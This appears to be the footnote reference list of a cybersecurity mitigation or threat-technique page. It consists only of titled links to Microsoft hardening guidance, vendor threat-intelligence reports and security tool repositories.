[^91]: [store_pwd_rev_enc](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)


[^92]: [UCF STIG Symbolic Links](https://www.stigviewer.com/stig/windows_server_2008_r2_member_server/2015-06-25/finding/V-26482)


[^93]: [ITSyndicate Disabling PHP functions](https://itsyndicate.org/blog/disabling-dangerous-php-functions/)


[^94]: [Microsoft runas](https://technet.microsoft.com/en-us/library/bb490994.aspx)


[^95]: [Symantec Briba May 2012](https://www.symantec.com/security_response/writeup.jsp?docid=2012-051515-2843-99)


[^96]: [Elastic Latrodectus May 2024](https://www.elastic.co/security-labs/spring-cleaning-with-latrodectus)


[^97]: [Microsoft Application Lockdown](https://docs.microsoft.com/en-us/previous-versions/technet-magazine/cc510322(v=msdn.10)?redirectedfrom=MSDN)


[^98]: [Anomali Template Injection MAR 2018](https://forum.anomali.com/t/credential-harvesting-and-malicious-file-delivery-using-microsoft-office-template-injection/2104)


[^99]: [Office 365 Partner Relationships](https://docs.microsoft.com/en-us/microsoft-365/commerce/manage-partners?view=o365-worldwide)


[^100]: [Windows Blogs Microsoft Edge Sandbox](https://blogs.windows.com/msedgedev/2017/03/23/strengthening-microsoft-edge-sandbox/)


[^101]: [Kernel.org Restrict Kernel Module](https://patchwork.kernel.org/patch/8754821/)


[^102]: [ESET Gamaredon June 2020](https://www.welivesecurity.com/2020/06/11/gamaredon-group-grows-its-game/)


[^103]: [RedLock Instance Metadata API 2018](https://redlock.io/blog/instance-metadata-api-a-modern-day-trojan-horse)


[^104]: [Google Cloud Encryption Key Rotation](https://cloud.google.com/kms/docs/key-rotation)


[^105]: [Symantec SSH and ssh-agent](https://www.symantec.com/connect/articles/ssh-and-ssh-agent)


[^106]: [FireEye FELIXROOT July 2018](https://web.archive.org/web/20200607025424/https://www.fireeye.com/blog/threat-research/2018/07/microsoft-office-vulnerabilities-used-to-distribute-felixroot-backdoor.html)


[^107]: [TechNet Removable Media Control](https://technet.microsoft.com/en-us/library/cc772540(v=ws.10).aspx)


[^108]: [GitHub MOTW](https://gist.github.com/wdormann/fca29e0dcda8b5c0472e73e10c78c3e7)


[^109]: [Microsoft Protected Users Security Group](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)


[^110]: [Electron Security 3](https://medium.com/certik/vulnerability-in-electron-based-application-unintentionally-giving-malicious-code-room-to-run-e2e1447d01b8)


[^111]: [Content trust in Azure Container Registry](https://docs.microsoft.com/en-us/azure/container-registry/container-registry-content-trust)


[^112]: [US-CERT-TA18-106A](https://www.us-cert.gov/ncas/alerts/TA18-106A)


[^113]: [ADSecurity AD Kerberos Attacks](https://adsecurity.org/?p=556)


[^114]: [dhcp_serv_op_events](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn800668(v=ws.11))


[^115]: [Microsoft System Services Fundamentals](https://social.technet.microsoft.com/wiki/contents/articles/12229.windows-system-services-fundamentals.aspx)


[^116]: [Crowdstrike DNC June 2016](https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/)


[^117]: [Default VBS macros Blocking ](https://techcommunity.microsoft.com/t5/microsoft-365-blog/helping-users-stay-safe-blocking-internet-macros-by-default-in/ba-p/3071805)


[^118]: [Powersploit](https://github.com/mattifestation/PowerSploit)


[^119]: [Microsoft Network access Credential Manager](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/jj852185(v=ws.11)?redirectedfrom=MSDN)


[^120]: [Cisco IOS Software Integrity Assurance - Secure Boot](https://tools.cisco.com/security/center/resources/integrity_assurance.html#35)


[^121]: [Korean FSI TA505 2020](https://www.fsec.or.kr/user/bbs/fsec/163/344/bbsDataView/1382.do?page=1&column=&search=&searchSDate=&searchEDate=&bbsDataCategory=)


[^122]: [FireEye Know Your Enemy FIN8 Aug 2016](https://www2.fireeye.com/WBNR-Know-Your-Enemy-UNC622-Spear-Phishing.html)


[^123]: [Docker Daemon Socket Protect](https://docs.docker.com/engine/security/protect-access/)


[^124]: [Microsoft Using Software Restriction ](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/ee791851(v=ws.11)?redirectedfrom=MSDN)


[^125]: [MagicWeb](https://www.microsoft.com/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/)


[^126]: [Apple Unified Log Analysis Remote Login and Screen Sharing](https://sarah-edwards-xzkc.squarespace.com/blog/2020/4/30/analysis-of-apple-unified-logs-quarantine-edition-entry-6-working-from-home-remote-logins)


[^127]: [University of Birmingham C2](https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf)


[^128]: [Microsoft Primary Refresh Token](https://learn.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token)


[^129]: [Brining MimiKatz to Unix](https://labs.portcullis.co.uk/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf)


[^130]: [FireEye ADFS](https://www.troopers.de/troopers19/agenda/fpxwmn/)


[^131]: [ESET Telebots July 2017](https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/)


[^132]: [US-CERT SMB Security](https://www.us-cert.gov/ncas/current-activity/2017/01/16/SMB-Security-Best-Practices)


[^133]: [Microsoft Trust Considerations Nov 2014](https://technet.microsoft.com/library/cc755321.aspx)


[^134]: [Mandiant Azure AD Backdoors](https://www.mandiant.com/resources/detecting-microsoft-365-azure-active-directory-backdoors)


[^135]: [CISA Phishing](https://www.cisa.gov/news-events/news/avoiding-social-engineering-and-phishing-attacks)


[^136]: [Microsoft CreateProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)


[^137]: [Microsoft driver block rules](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-driver-block-rules)


[^138]: [MRWLabs Office Persistence Add-ins](https://web.archive.org/web/20190526112859/https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/)


[^139]: [Crowdstrike HuntReport 2022](https://go.crowdstrike.com/rs/281-OBQ-266/images/2022OverWatchThreatHuntingReport.pdf)


[^140]: [Crysys Skywiper](https://www.crysys.hu/publications/files/skywiper.pdf)


[^141]: [Microsoft Dev Tunnels Group Policy Mitigation](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/policies)


[^142]: [Wikipedia HPKP](https://en.wikipedia.org/wiki/HTTP_Public_Key_Pinning)


[^143]: [Re-Open windows on Mac](https://support.apple.com/en-us/HT204005)


[^144]: [Dell Sakula](http://www.secureworks.com/cyber-threat-intelligence/threats/sakula-malware-family/)


[^145]: [Kubernetes Service Accounts](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/)


[^146]: [Microsoft Common Conditional Access Policies](https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/concept-conditional-access-policy-common)


[^147]: [GitHub IAD Secure Host Baseline UAC Filtering](https://github.com/iadgov/Secure-Host-Baseline/blob/master/Windows/Group%20Policy%20Templates/en-US/SecGuide.adml)


[^148]: [Google Cloud Threat Intelligence ESXi Hardening 2023](https://cloud.google.com/blog/topics/threat-intelligence/vmware-detection-containment-hardening)


[^149]: [Corio 2008](https://learn.microsoft.com/en-us/previous-versions/technet-magazine/cc510322(v=msdn.10))


[^150]: [Stealthbits Cracking AS-REP Roasting Jun 2019](https://blog.stealthbits.com/cracking-active-directory-passwords-with-as-rep-roasting/)


[^151]: [AWS Data Perimeters](https://aws.amazon.com/identity/data-perimeters-on-aws/)


[^152]: [lolbas project Zipfldr.dll](https://lolbas-project.github.io/lolbas/Libraries/Zipfldr/)


[^153]: [Malicious Driver Reporting Center](https://www.microsoft.com/security/blog/2021/12/08/improve-kernel-security-with-the-new-microsoft-vulnerable-and-malicious-driver-reporting-center/)


[^154]: [Cybereason Dissecting DGAs](http://go.cybereason.com/rs/996-YZT-709/images/Cybereason-Lab-Analysis-Dissecting-DGAs-Eight-Real-World-DGA-Variants.pdf)


[^155]: [Kernel Self Protection Project](https://www.kernel.org/doc/html/latest/security/self-protection.html)


[^156]: [AdSecurity Cracking Kerberos Dec 2015](https://adsecurity.org/?p=2293)


[^157]: [AdSecurity DCSync Sept 2015](https://adsecurity.org/?p=1729)


[^158]: [Cybereason TA505 April 2019](https://www.cybereason.com/blog/threat-actor-ta505-targets-financial-enterprises-using-lolbins-and-a-new-backdoor-malware)


[^159]: [Tilbury Windows Credentials](https://www.first.org/resources/papers/conf2017/Windows-Credentials-Attacks-and-Mitigation-Techniques.pdf)


[^160]: [IBM StrelaStealer 2024](https://securityintelligence.com/x-force/strela-stealer-todays-invoice-tomorrows-phish/)


[^161]: [ADSecurity Mimikatz DCSync](https://adsecurity.org/?p=1729)


[^162]: [Unit 42 Playbook Dec 2017](https://pan-unit42.github.io/playbook_viewer/)


[^163]: [ESET GreyEnergy Oct 2018](https://www.welivesecurity.com/wp-content/uploads/2018/10/ESET_GreyEnergy.pdf)


[^164]: [Microsoft WDigest Mit](https://support.microsoft.com/en-us/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-a)


[^165]: [SourceForge rkhunter](http://rkhunter.sourceforge.net)


[^166]: [Microsoft Requests for Azure AD Roles in Privileged Identity Management](https://learn.microsoft.com/en-us/azure/active-directory/privileged-identity-management/azure-ad-pim-approval-workflow)


[^167]: [W3C](https://www.w3.org/TR/fingerprinting-guidance/)


[^168]: [Gmail Delegation](https://support.google.com/a/answer/7223765?hl=en)


[^169]: [Trend Micro CPL](https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf)


[^170]: [Cisco IOS Software Integrity Assurance - Image File Verification](https://tools.cisco.com/security/center/resources/integrity_assurance.html#7)


[^171]: [Bitdefender FunnyDream Campaign November 2020](https://www.bitdefender.com/files/News/CaseStudies/study/379/Bitdefender-Whitepaper-Chinese-APT.pdf)


[^172]: [Microsoft Disable Macros](https://support.office.com/article/enable-or-disable-macros-in-office-files-12b036fd-d140-4e74-b45e-16fed1a7e5c6)


[^173]: [Rhino S3 Ransomware Part 2](https://rhinosecuritylabs.com/aws/s3-ransomware-part-2-prevention-and-defense/)


[^174]: [Microsoft TESTSIGNING Feb 2021](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/the-testsigning-boot-configuration-option)


[^175]: [Microsoft 365 External Sharing](https://learn.microsoft.com/en-us/sharepoint/turn-external-sharing-on-or-off)


[^176]: [Microsoft Dynamic Link Library Search Order](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order?redirectedfrom=MSDN)


[^177]: [TechNet RDP Gateway](https://technet.microsoft.com/en-us/library/cc731150.aspx)


[^178]: [lolbas project Ieframe.dll](https://lolbas-project.github.io/lolbas/Libraries/Ieframe/)


[^179]: [Microsoft Azure Storage Security, 2019](https://docs.microsoft.com/en-us/azure/storage/common/storage-security-guide)


[^180]: [This is Security Command Line Confusion](https://www.stormshield.com/news/poweliks-command-line-confusion/)


[^181]: [win_xml_evt_log](https://forensicswiki.xyz/wiki/index.php?title=Windows_XML_Event_Log_(EVTX))


[^182]: [Microsoft ADV170021 Dec 2017](https://portal.msrc.microsoft.com/security-guidance/advisory/ADV170021)


[^183]: [Amazon S3 Security, 2019](https://aws.amazon.com/premiumsupport/knowledge-center/secure-s3-resources/)


[^184]: [ESET Zebrocy May 2019](https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/)


[^185]: [TechNet Secure Boot Process](https://docs.microsoft.com/en-us/windows/security/information-protection/secure-the-windows-10-boot-process)


[^186]: [Volexity Exchange Marauder March 2021](https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/)


[^187]: [Google Workspace External Sharing](https://support.google.com/a/answer/60781)


[^188]: [AWS RE:Inforce Threat Detection 2024](https://reinforce.awsevents.com/content/dam/reinforce/2024/slides/TDR432_New-tactics-and-techniques-for-proactive-threat-detection.pdf)


[^189]: [Microsoft Configure LSA](https://technet.microsoft.com/en-us/library/dn408187.aspx)


[^190]: [GitHub PSPKIAudit](https://github.com/GhostPack/PSPKIAudit)


[^191]: [MS14-025](https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati)


[^192]: [Microsoft Dev Tunnels Group Policies](https://techcommunity.microsoft.com/blog/azuredevcommunityblog/manage-dev-tunnels-with-group-policies/4149472)


[^193]: [Wikipedia 802.1x](https://en.wikipedia.org/wiki/IEEE_802.1X)


[^194]: [Kubernetes API Control Access](https://kubernetes.io/docs/concepts/security/controlling-access/)


[^195]: [Trendmicro_IcedID](https://www.trendmicro.com/en_us/research/22/l/icedid-botnet-distributors-abuse-google-ppc-to-distribute-malware.html)


[^196]: [ReasonLabs](https://cyberpedia.reasonlabs.com/EN/dead%20code%20insertion.html)


[^197]: [Microsoft Dynamic-Link Library Security](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security?redirectedfrom=MSDN)


[^198]: [piazza launch agent mitigation](https://antman1p-30185.medium.com/defeating-malicious-launch-persistence-156e2b40fc67)


[^199]: [Azure Subscription Policies](https://learn.microsoft.com/en-us/azure/cost-management-billing/manage/manage-azure-subscription-policy)


[^200]: [Cisco IOS Software Integrity Assurance - Image File Integrity](https://tools.cisco.com/security/center/resources/integrity_assurance.html#30)


[^201]: [Crowdstrike Hypervisor Jackpotting Pt 2 2021](https://www.crowdstrike.com/en-us/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/)


[^202]: [1 - appv](https://securelist.com/bluenoroff-methods-bypass-motw/108383/)


[^203]: [InsiderThreat NTFS EA Oct 2017](https://blog.stealthbits.com/attack-step-3-persistence-ntfs-extended-attributes-file-system-attacks)


[^204]: [Windows RDP Sessions](https://technet.microsoft.com/en-us/library/cc754272(v=ws.11).aspx)


[^205]: [Enigma Reviving DDE Jan 2018](https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee)


[^206]: [Obfuscated scripts](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-execution-of-potentially-obfuscated-scripts)


[^207]: [Windows Commands JPCERT](https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html)


[^208]: [DFIR Conti Bazar Nov 2021](https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/)


[^209]: [Microsoft Securing Privileged Access](https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#a-nameesaebmaesae-administrative-forest-design-approach)


[^210]: [Microsoft PS JEA](https://learn.microsoft.com/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.3)


[^211]: [Google Cloud Threat Intelligence ESXi VIBs 2022](https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-malware-persistence)


[^212]: [def_ev_win_event_logging](https://www.hackingarticles.in/defense-evasion-windows-event-logging-t1562-002/)


[^213]: [Medium KONNI Jan 2020](https://medium.com/d-hunter/a-look-into-konni-2019-campaign-b45a0f321e9b)


[^214]: [ATT QakBot April 2021](https://cybersecurity.att.com/blogs/labs-research/the-rise-of-qakbot)


[^215]: [Microsoft GPO Bluetooth FEB 2009](https://technet.microsoft.com/library/dd252791.aspx)


[^216]: [audits linikatz](https://github.com/CiscoCXSecurity/linikatz/blob/master/blue/audit/audit.rules)


[^217]: [US-CERT TA18-106A Network Infrastructure Devices 2018](https://us-cert.cisa.gov/ncas/alerts/TA18-106A)


[^218]: [Electron Security 2](https://stackoverflow.com/questions/48854265/why-do-i-see-an-electron-security-warning-after-updating-my-electron-project-t)


[^219]: [Halcyon AWS Ransomware 2025](https://www.halcyon.ai/blog/abusing-aws-native-services-ransomware-encrypting-s3-buckets-with-sse-c)


[^220]: [Microsoft Disable VBA Jan 2020](https://docs.microsoft.com/en-us/previous-versions/office/troubleshoot/office-developer/turn-off-visual-basic-for-application)


[^221]: [Microsoft ISAPICGIRestriction 2016](https://docs.microsoft.com/en-us/iis/configuration/system.webserver/security/isapicgirestriction/)


[^222]: [cisco_deploy_rsa_keys](https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/sec_conn_pki/configuration/xe-17/sec-pki-xe-17-book/sec-deploy-rsa-pki.html#GUID-1CB802D8-9DE3-447F-BECE-CF22F5E11436)


[^223]: [RedCanary Mockingbird May 2020](https://redcanary.com/blog/blue-mockingbird-cryptominer/)


[^224]: [Gigamon Berserk Bear October 2021](https://vblocalhost.com/uploads/VB2021-Slowik.pdf)


[^225]: [TechNet Server Operator Scheduled Task](https://technet.microsoft.com/library/jj852168.aspx)


[^226]: [DFIR Report APT35 ProxyShell March 2022](https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell)


[^227]: [Microsoft Token Protection 2023](https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-token-protection)


[^228]: [Arbor Musical Chairs Feb 2018](https://www.arbornetworks.com/blog/asert/musical-chairs-playing-tetris/)


[^229]: [FireEye Clandestine Fox](https://www.fireeye.com/blog/threat-research/2014/04/new-zero-day-exploit-targeting-internet-explorer-versions-9-through-11-identified-in-targeted-attacks.html)


[^230]: [MSTIC NOBELIUM Mar 2021](https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/)


[^231]: [Crowdstrike GTR2020 Mar 2020](https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2020CrowdStrikeGlobalThreatReport.pdf)


[^232]: [Microsoft COM ACL](https://docs.microsoft.com/en-us/windows/desktop/com/dcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1)


[^233]: [Kaspersky ToddyCat Check Logs October 2023](https://securelist.com/toddycat-keep-calm-and-check-logs/110696/)


[^234]: [Cylance Shell Crew Feb 2017](https://www.cylance.com/shell-crew-variants-continue-to-fly-under-big-avs-radar)


[^235]: [ZScaler Squirrelwaffle Sep 2021](https://www.zscaler.com/blogs/security-research/squirrelwaffle-new-loader-delivering-cobalt-strike)


[^236]: [Prevailion EvilNum May 2020](https://web.archive.org/web/20221209052853/https://www.prevailion.com/phantom-in-the-command-shell-2/)


[^237]: [Github NoRunDll](https://github.com/gtworek/PSBits/tree/master/NoRunDll)


[^238]: [Microsoft File Folder Exclusions](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-contextual-file-folder-exclusions-microsoft-defender-antivirus)


[^239]: [Sophos Ragnar May 2020](https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/)


[^240]: [ESET Dukes October 2019](https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Operation_Ghost_Dukes.pdf)


[^241]: [GitHub Disable DDEAUTO Oct 2017](https://gist.github.com/wdormann/732bb88d9b5dd5a66c9f1e1498f31a1b)


[^242]: [Kubernetes Security Context](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)


[^243]: [Executable Installers are Vulnerable](https://seclists.org/fulldisclosure/2015/Dec/34)


[^244]: [Microsoft Preauthentication Jul 2012](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961961(v=technet.10)?redirectedfrom=MSDN)


[^245]: [Microsoft Security Alerts for Azure AD Roles](https://learn.microsoft.com/en-us/security/benchmark/azure/baselines/aad-security-baseline)


[^246]: [Amazon AWS IMDS V2](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/)


[^247]: [Microsoft Get-InboxRule](https://docs.microsoft.com/en-us/powershell/module/exchange/get-inboxrule?view=exchange-ps)


[^248]: [CyberArk Labs Safe Mode 2016](https://www.cyberark.com/resources/blog/cyberark-labs-from-safe-mode-to-domain-compromise)


[^249]: [SWAT-hospital](https://www.beckershospitalreview.com/cybersecurity/hackers-threaten-to-send-swat-teams-to-fred-hutch-patients-homes.html)


[^250]: [Mandiant FIN7 Apr 2022](https://www.mandiant.com/resources/evolution-of-fin7)


[^251]: [Sophos User Interaction](https://www.sophos.com/en-us/blog/evil-evolution-clickfix-and-macos-infostealers)


[^252]: [Cisco IOS Software Integrity Assurance - TACACS](https://tools.cisco.com/security/center/resources/integrity_assurance.html#39)


[^253]: [Microsoft ASR Obfuscation](https://learn.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference#block-execution-of-potentially-obfuscated-scripts)


[^254]: [Cisco IOS Software Integrity Assurance - AAA](https://tools.cisco.com/security/center/resources/integrity_assurance.html#38)


[^255]: [US-CERT BLINDINGCAN Aug 2020](https://us-cert.cisa.gov/ncas/analysis-reports/ar20-232a)


[^256]: [Cisco ARP Poisoning Mitigation 2016](https://www.cisco.com/c/en/us/products/collateral/switches/catalyst-6500-series-switches/white_paper_c11_603839.html)


[^257]: [Microsoft WMI Filters](https://blogs.technet.microsoft.com/askds/2008/09/11/fun-with-wmi-filters-in-group-policy/)


[^258]: [TCC macOS bypass](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)


[^259]: [Microsoft ASR Nov 2017](https://docs.microsoft.com/windows/threat-protection/windows-defender-exploit-guard/enable-attack-surface-reduction)


[^260]: [Defending Against Malicious Cyber Activity Originating from Tor](https://www.cisa.gov/sites/default/files/publications/AA20-183A_Defending_Against_Malicious_Cyber_Activity_Originating_from_Tor_S508C.pdf)


[^261]: [CloudSploit - Unused AWS Regions](https://medium.com/cloudsploit/the-danger-of-unused-aws-regions-af0bf1b878fc)


[^262]: [Content trust in Docker](https://docs.docker.com/engine/security/trust/content_trust/)


[^263]: [group-ib_redcurl1](https://www.group-ib.com/resources/research-hub/red-curl/)


[^264]: [SpectorOps Code Signing Dec 2017](https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec)


[^265]: [ESET Turla Mosquito Jan 2018](https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf)


[^266]: [Palo Alto Sofacy 06-2018](https://researchcenter.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/)


[^267]: [Unit 42 Bisonal July 2018](https://researchcenter.paloaltonetworks.com/2018/07/unit42-bisonal-malware-used-attacks-russia-south-korea/)


[^268]: [NSA Spotting](https://massarobi.wordpress.com/wp-content/uploads/2017/03/spotting-the-adversary-with-windows-event-log-monitoring.pdf)


[^269]: [Ready.gov IT DRP](https://www.ready.gov/business/implementation/IT)


[^270]: [AWS - IAM Console Best Practices](https://aws.amazon.com/blogs/security/newly-updated-features-in-the-aws-iam-console-help-you-adhere-to-iam-best-practices/)


[^271]: [HowToGeek ShowExtension](https://www.howtogeek.com/205086/beginner-how-to-make-windows-show-file-extensions/)


[^272]: [TechNet Least Privilege](https://technet.microsoft.com/en-us/library/dn487450.aspx)


[^273]: [Microsoft Nobelium Admin Privileges](https://www.microsoft.com/security/blog/2021/10/25/nobelium-targeting-delegated-administrative-privileges-to-facilitate-broader-attacks)


[^274]: [Secure Ideas SMB Relay](https://blog.secureideas.com/2018/04/ever-run-a-relay-why-smb-relays-should-be-on-your-mind.html)


[^275]: [MSTIC Nobelium Toolset May 2021](https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/)


[^276]: [Proofpoint TA427 April 2024](https://www.proofpoint.com/us/blog/threat-insight/social-engineering-dmarc-abuse-ta427s-art-information-gathering)


[^277]: [F-Secure Sofacy 2015](https://labsblog.f-secure.com/2015/09/08/sofacy-recycles-carberp-and-metasploit-code/)


[^278]: [Juniper DAI 2020](https://www.juniper.net/documentation/en_US/junos/topics/task/configuration/understanding-and-using-dai.html)


[^279]: [F-Secure CozyDuke](https://www.f-secure.com/documents/996508/1030745/CozyDuke)


[^280]: [Seqrite DoubleExtension](https://www.seqrite.com/blog/how-to-avoid-dual-attack-and-vulnerable-files-with-double-extension/)


[^281]: [Kubernetes Admission Controllers](https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers)


[^282]: [CodeX Microsoft Defender 2021](https://medium.com/codex/my-learnings-on-microsoft-defender-for-endpoint-and-exclusions-ddacf2fdd047)


[^283]: [Bleeping Computer Latrodectus April 2024](https://www.bleepingcomputer.com/news/security/new-latrodectus-malware-attacks-use-microsoft-cloudflare-themes/)


[^284]: [Graeber 2014](http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html)


[^285]: [Microsoft AppLocker DLL](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/dll-rules-in-applocker)


[^286]: [S2W Troll Stealer 2024](https://medium.com/s2wblog/kimsuky-disguised-as-a-korean-company-signed-with-a-valid-certificate-to-distribute-troll-stealer-cfa5d54314e2)


[^287]: [Cisco Blog Legacy Device Attacks](https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954)


[^288]: [Berkley Secure](https://security.berkeley.edu/node/94)


[^289]: [MFA Fatigue Attacks - PortSwigger](https://portswigger.net/daily-swig/mfa-fatigue-attacks-users-tricked-into-allowing-device-access-due-to-overload-of-push-notifications)


[^290]: [LKM loading kernel restrictions](https://xorl.wordpress.com/2018/02/17/lkm-loading-kernel-restrictions/)


[^291]: [file_upload_attacks_pt2](https://blog.yeswehack.com/yeswerhackers/file-upload-attacks-part-2/)


[^292]: [GitHub SHB Credential Guard](https://github.com/iadgov/Secure-Host-Baseline/tree/master/Credential%20Guard)


[^293]: [ClearSky Wilted Tulip July 2017](http://www.clearskysec.com/wp-content/uploads/2017/07/Operation_Wilted_Tulip.pdf)


[^294]: [GitHub Certify](https://github.com/GhostPack/Certify/)


[^295]: [Microsoft AMSI June 2015](https://cloudblogs.microsoft.com/microsoftsecure/2015/06/09/windows-10-to-offer-application-developers-new-malware-defenses/?source=mmpc)


[^296]: [Symantec Daggerfly 2023](https://symantec-enterprise-blogs.security.com/threat-intelligence/apt-attacks-telecoms-africa-mgbot)


[^297]: [Palo Alto Gamaredon Feb 2017](https://researchcenter.paloaltonetworks.com/2017/02/unit-42-title-gamaredon-group-toolset-evolution/)


[^298]: [Microsoft Process Wide Com Keys](https://msdn.microsoft.com/en-us/library/windows/desktop/ms687317(v=vs.85).aspx)


[^299]: [Technospot Chrome Extensions GP](http://www.technospot.net/blogs/block-chrome-extensions-using-google-chrome-group-policy-settings/)


[^300]: [Microsoft Create Token](https://docs.microsoft.com/windows/device-security/security-policy-settings/create-a-token-object)


[^301]: [Symantec BITS May 2007](https://www.symantec.com/connect/blogs/malware-update-windows-update)


[^302]: [Microsoft KnuckleTouch 2024](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Backdoor:Win64/KnuckleTouch.A!dha&threatId=-2147067254)


[^303]: [Symantec Bumblebee June 2022](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bumblebee-loader-cybercrime)


[^304]: [FireEye WMI 2015](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf)


[^305]: [Microsoft Storm-501 Sabbath Ransomware Embargo September 2024](https://www.microsoft.com/en-us/security/blog/2024/09/26/storm-0501-ransomware-attacks-expanding-to-hybrid-cloud-environments/)


[^306]: [Metcalf 2015](http://adsecurity.org/?p=1275)


[^307]: [Talos ZxShell Oct 2014](https://blogs.cisco.com/security/talos/opening-zxshell)


[^308]: [Cisco Umbrella DGA Brute Force](https://umbrella.cisco.com/blog/2015/02/18/at-high-noon-algorithms-do-battle/)


[^309]: [SE SentinelOne 2](https://www.sentinelone.com/cybersecurity-101/threat-intelligence/types-of-social-engineering-attacks/)


[^310]: [Microsoft Sxstrace](https://docs.microsoft.com/windows-server/administration/windows-commands/sxstrace)


[^311]: [Okta Block Anonymizing Services](https://sec.okta.com/blockanonymizers)


[^312]: [CISA MFA PrintNightmare](https://www.cisa.gov/uscert/ncas/alerts/aa22-074a)


[^313]: [Crowdstrike Qakbot October 2020](https://www.crowdstrike.com/blog/duck-hunting-with-falcon-complete-qakbot-zip-based-campaign/)


[^314]: [Mandiant APT29 Microsoft 365 2022](https://www.mandiant.com/resources/blog/apt29-continues-targeting-microsoft)


[^315]: [ADSecurity Kerberos and KRBTGT](https://adsecurity.org/?p=483)


[^316]: [HP SVCReady Jun 2022](https://threatresearch.ext.hp.com/svcready-a-new-loader-reveals-itself/)


[^317]: [Kubernetes Hardening Guide](https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF)


[^318]: [Mandiant Defend UNC2452 White Paper](https://www.mandiant.com/resources/blog/remediation-and-hardening-strategies-for-microsoft-365-to-defend-against-unc2452)


[^319]: [MITRE VMware Abuse 2024](https://medium.com/mitre-engenuity/infiltrating-defenses-abusing-vmware-in-mitres-cyber-intrusion-4ea647b83f5b)


[^320]: [TechNet Screensaver GP](https://technet.microsoft.com/library/cc938799.aspx)


[^321]: [ESET Security Mispadu Facebook Ads 2019](https://www.welivesecurity.com/2019/11/19/mispadu-advertisement-discounted-unhappy-meal/)


[^322]: [UCF STIG Elevation Account Enumeration](https://www.stigviewer.com/stig/microsoft_windows_server_2012_member_server/2013-07-25/finding/WN12-CC-000077)


[^323]: [Microsoft Netdom Trust Sept 2012](https://technet.microsoft.com/library/cc835085.aspx)


[^324]: [Broadcom ESXi Lockdown Mode](https://knowledge.broadcom.com/external/article/336894/enabling-or-disabling-lockdown-mode-on-a.html)


[^325]: [Increasing Linux kernel integrity](https://linux-audit.com/increase-kernel-integrity-with-disabled-linux-kernel-modules-loading/)


[^326]: [Attackify Rundll32.exe Obscurity](https://www.attackify.com/blog/rundll32_execution_order/)


